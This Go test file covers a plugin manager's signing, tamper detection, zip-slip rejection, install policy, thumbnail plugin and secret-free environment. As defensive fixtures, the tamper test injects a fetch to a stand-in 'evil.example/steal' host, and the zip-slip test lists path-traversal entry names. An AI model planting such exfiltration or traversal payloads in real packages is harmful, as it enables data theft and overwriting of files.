package plugin

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/easycloud/easycloud/internal/database/dbtest"
	"github.com/easycloud/easycloud/pkg/pluginsdk"
)

func TestSatisfies(t *testing.T) {
	cases := []struct {
		v, r string
		ok   bool
	}{
		{"0.3.0", ">=0.3.0", true}, {"0.2.9", ">=0.3.0", false}, {"1.0.0", ">=0.3.0 <1.0.0", false},
		{"0.9.1", ">=0.3.0 <1.0.0", true}, {"0.3.5", "^0.3.0", true}, {"0.4.0", "^0.3.0", false},
		{"1.4.0", "^1.2.0", true}, {"2.0.0", "^1.2.0", false}, {"dev", ">=9.0.0", true},
	}
	for _, c := range cases {
		if got, err := Satisfies(c.v, c.r); err != nil || got != c.ok {
			t.Errorf("Satisfies(%s, %q) = %v, %v", c.v, c.r, got, err)
		}
	}
	if _, err := Satisfies("1.0.0", "~>1"); err == nil {
		t.Error("bad operator accepted")
	}
}

func viewerDir(t *testing.T) string {
	d := t.TempDir()
	os.WriteFile(filepath.Join(d, "manifest.json"), []byte(`{"id":"md-viewer","name":"MD","version":"1.0.0","type":"viewer",
		"engines":{"easycloud":">=0.1.0"},"viewer":{"entry":"index.js","extensions":[".md"]}}`), 0o644)
	os.WriteFile(filepath.Join(d, "index.js"), []byte("export default { mount() {} }"), 0o644)
	return d
}

func TestSignVerifyTamper(t *testing.T) {
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	other, _, _ := ed25519.GenerateKey(rand.Reader)
	data, err := Build(viewerDir(t), priv)
	if err != nil {
		t.Fatal(err)
	}
	p, err := Open(data)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := p.Verify([]ed25519.PublicKey{other, pub}); err != nil {
		t.Fatal(err)
	}
	if _, err := p.Verify([]ed25519.PublicKey{other}); err == nil {
		t.Fatal("verified with wrong key")
	}
	// Tamper: change index.js but keep the signature.
	zr, _ := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, f := range zr.File {
		if f.Name == "index.js" {
			w, _ := zw.Create("index.js")
			w.Write([]byte("fetch('https://evil.example/steal')"))
			continue
		}
		zw.Copy(f)
	}
	zw.Close()
	tp, err := Open(buf.Bytes())
	if err != nil {
		t.Fatal(err)
	}
	if _, err := tp.Verify([]ed25519.PublicKey{pub}); err == nil {
		t.Fatal("tampered package verified")
	}
}

func TestZipSlipRejected(t *testing.T) {
	for _, name := range []string{"../evil.js", "/abs.js", "a/../../b", ".easycloud/x", "a\\..\\b"} {
		var buf bytes.Buffer
		zw := zip.NewWriter(&buf)
		w, _ := zw.Create("manifest.json")
		w.Write([]byte(`{}`))
		w, _ = zw.Create(name)
		w.Write([]byte("x"))
		zw.Close()
		if _, err := Open(buf.Bytes()); err == nil {
			t.Errorf("archive entry %q accepted", name)
		}
	}
}

func newManager(t *testing.T, opts Options) *Manager {
	db := dbtest.Open(t, dbtestSQLite())
	opts.Dir = t.TempDir()
	if opts.HostVersion == "" {
		opts.HostVersion = "0.3.0"
	}
	m := NewManager(db, opts, dbtest.Logger())
	if err := m.Load(context.Background()); err != nil {
		t.Fatal(err)
	}
	return m
}

func TestInstallPolicy(t *testing.T) {
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	unsigned, _ := Build(viewerDir(t), nil)
	signed, _ := Build(viewerDir(t), priv)
	ctx := context.Background()

	m := newManager(t, Options{TrustedKeys: []ed25519.PublicKey{pub}})
	if _, err := m.Install(ctx, unsigned); !errors.Is(err, ErrUntrusted) {
		t.Fatalf("unsigned install: %v", err)
	}
	inst, err := m.Install(ctx, signed)
	if err != nil || inst.SignedBy != KeyID(pub) || inst.Status != "ready" {
		t.Fatalf("signed install: %+v %v", inst, err)
	}
	if v := m.Viewers(); len(v) != 1 || v[0].Entry != "/plugins/md-viewer/1.0.0/index.js" {
		t.Fatalf("viewers %+v", v)
	}
	if dir, ok := m.StaticDir("md-viewer", "1.0.0"); !ok {
		t.Fatal("static dir")
	} else if _, err := os.Stat(filepath.Join(dir, "index.js")); err != nil {
		t.Fatal(err)
	} else if _, err := os.Stat(filepath.Join(dir, "signature.json")); err == nil {
		t.Fatal("signature.json should not be extracted")
	}
	off := false
	if err := m.Update(ctx, "md-viewer", &off, nil); err != nil || len(m.Viewers()) != 0 {
		t.Fatal("disable", err)
	}
	if err := m.Remove(ctx, "md-viewer"); err != nil || len(m.List()) != 0 {
		t.Fatal("remove", err)
	}

	// Engine range is enforced.
	m2 := newManager(t, Options{AllowUnsigned: true, HostVersion: "0.0.5"})
	if _, err := m2.Install(ctx, unsigned); !errors.Is(err, ErrInvalid) {
		t.Fatalf("engine mismatch: %v", err)
	}
}

func TestBackendPluginEndToEnd(t *testing.T) {
	if _, err := exec.LookPath("ffmpeg"); err != nil {
		t.Skip("ffmpeg not installed")
	}
	if testing.Short() {
		t.Skip("builds a plugin binary")
	}
	src := t.TempDir()
	plat := runtime.GOOS + "-" + runtime.GOARCH
	bin := filepath.Join(src, "bin", plat, "ffmpeg-thumbnail")
	build := exec.Command("go", "build", "-o", bin, "github.com/easycloud/easycloud/plugins/ffmpeg-thumbnail")
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build plugin: %v\n%s", err, out)
	}
	man, _ := os.ReadFile("../../plugins/ffmpeg-thumbnail/manifest.json")
	os.WriteFile(filepath.Join(src, "manifest.json"), man, 0o644)
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	data, err := Build(src, priv)
	if err != nil {
		t.Fatal(err)
	}

	m := newManager(t, Options{TrustedKeys: []ed25519.PublicKey{pub}})
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go m.Run(ctx)
	time.Sleep(50 * time.Millisecond)
	inst, err := m.Install(ctx, data)
	if err != nil {
		t.Fatal(err)
	}
	if inst.Status != "running" {
		t.Fatalf("status %s: %s", inst.Status, inst.Error)
	}
	video := filepath.Join(t.TempDir(), "clip.mp4")
	if out, err := exec.Command("ffmpeg", "-hide_banner", "-loglevel", "error", "-f", "lavfi", "-i", "testsrc=duration=1:size=640x360:rate=10",
		"-pix_fmt", "yuv420p", video).CombinedOutput(); err != nil {
		t.Fatalf("make video: %v %s", err, out)
	}
	ext, id, ok := m.ThumbnailProvider("video/mp4")
	if !ok || id != "ffmpeg-thumbnail" {
		t.Fatal("no provider for video/mp4")
	}
	if _, _, ok := m.ThumbnailProvider("text/plain"); ok {
		t.Fatal("provider for text/plain")
	}
	res, err := ext.Thumbnail(ctx, &pluginsdk.ThumbnailRequest{Path: video, Mime: "video/mp4", Size: 128})
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Image) < 100 || !bytes.HasPrefix(res.Image, []byte{0xFF, 0xD8}) {
		t.Fatalf("not a JPEG (%d bytes)", len(res.Image))
	}

	// Crash recovery: kill the process; the supervisor restarts it.
	m.mu.RLock()
	m.procs["ffmpeg-thumbnail"].client.Kill()
	m.mu.RUnlock()
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if e, _, ok := m.ThumbnailProvider("video/mp4"); ok {
			if _, err := e.Thumbnail(ctx, &pluginsdk.ThumbnailRequest{Path: video, Mime: "video/mp4", Size: 64}); err == nil {
				return
			}
		}
		time.Sleep(200 * time.Millisecond)
	}
	t.Fatal("plugin did not recover after crash")
}

func TestPluginEnvHasNoSecrets(t *testing.T) {
	t.Setenv("EASYCLOUD_DB_PASSWORD", "hunter2")
	for _, kv := range pluginEnv(map[string]any{"a": 1}) {
		if strings.Contains(kv, "hunter2") || strings.HasPrefix(kv, "EASYCLOUD_DB") {
			t.Fatalf("secret leaked into plugin env: %s", kv)
		}
	}
}
